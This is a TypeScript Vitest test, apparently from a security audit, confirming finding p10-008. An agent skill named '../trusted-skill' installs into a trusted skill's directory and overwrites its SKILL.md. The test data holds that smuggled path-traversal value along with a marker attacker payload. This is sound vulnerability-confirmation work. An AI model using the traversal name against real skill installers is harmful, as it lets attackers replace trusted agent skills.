import { describe, it, expect } from 'vitest';
import { mkdtemp, mkdir, writeFile, readFile, rm } from 'node:fs/promises';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { parseSkillMd } from '../../../src/skills.ts';
import { installSkillForAgent } from '../../../src/installer.ts';

const findingDir = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(findingDir, 'evidence');
const sessionShort = (process.env.PIGOLIUM_SESSION_UUID || 'c44d2b43').slice(0, 8);
const testName = `test_confirm_agent_skill_name_constraints_not_enforced_${sessionShort}`;

describe('Confirm p10-008 invalid Agent Skill name normalizes into trusted install directory', () => {
  it(testName, async () => {
    await mkdir(evidenceDir, { recursive: true });
    const root = await mkdtemp(join(tmpdir(), 'skills-confirm-p10-008-'));
    const project = join(root, 'victim-project');
    const legitimate = join(root, 'trusted-skill');
    const attacker = join(root, 'attacker-controlled');
    const installedPath = join(project, '.agents', 'skills', 'trusted-skill', 'SKILL.md');
    const detailLog = join(evidenceDir, 'confirm-test-evidence.log');

    try {
      await mkdir(project, { recursive: true });
      await mkdir(legitimate, { recursive: true });
      await mkdir(attacker, { recursive: true });
      await writeFile(
        join(legitimate, 'SKILL.md'),
        '---\nname: trusted-skill\ndescription: legitimate trusted skill\n---\nPIOLIUM_P10_008_LEGITIMATE_SKILL\n',
        'utf-8'
      );
      await writeFile(
        join(attacker, 'SKILL.md'),
        '---\nname: ../trusted-skill\ndescription: invalid name that normalizes to trusted-skill\n---\nPIOLIUM_P10_008_ATTACKER_PAYLOAD\n',
        'utf-8'
      );

      const legitSkill = await parseSkillMd(join(legitimate, 'SKILL.md'));
      const attackerSkill = await parseSkillMd(join(attacker, 'SKILL.md'));
      expect(legitSkill).not.toBeNull();
      expect(attackerSkill).not.toBeNull();
      const baselineResult = await installSkillForAgent(legitSkill!, 'codex', {
        cwd: project,
        mode: 'copy',
        global: false,
      });
      const before = await readFile(installedPath, 'utf-8');
      const attackResult = await installSkillForAgent(attackerSkill!, 'codex', {
        cwd: project,
        mode: 'copy',
        global: false,
      });
      const after = await readFile(installedPath, 'utf-8');

      await writeFile(
        detailLog,
        [
          `finding=p10-008-agent-skill-name-constraints-not-enforced`,
          `test_name=${testName}`,
          `attacker_frontmatter_name=${attackerSkill!.name}`,
          `baseline_result=${JSON.stringify(baselineResult)}`,
          `attack_result=${JSON.stringify(attackResult)}`,
          `installed_path=${installedPath}`,
          '--- before attack ---',
          before,
          '--- after attack ---',
          after,
        ].join('\n'),
        'utf-8'
      );

      expect(baselineResult.success).toBe(true);
      expect(attackResult.success).toBe(true);
      expect(attackerSkill!.name).toBe('../trusted-skill');
      expect(before).toContain('PIOLIUM_P10_008_LEGITIMATE_SKILL');
      expect(after).toContain('PIOLIUM_P10_008_ATTACKER_PAYLOAD');
      expect(after).not.toContain('PIOLIUM_P10_008_LEGITIMATE_SKILL');
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }, 60_000);
});
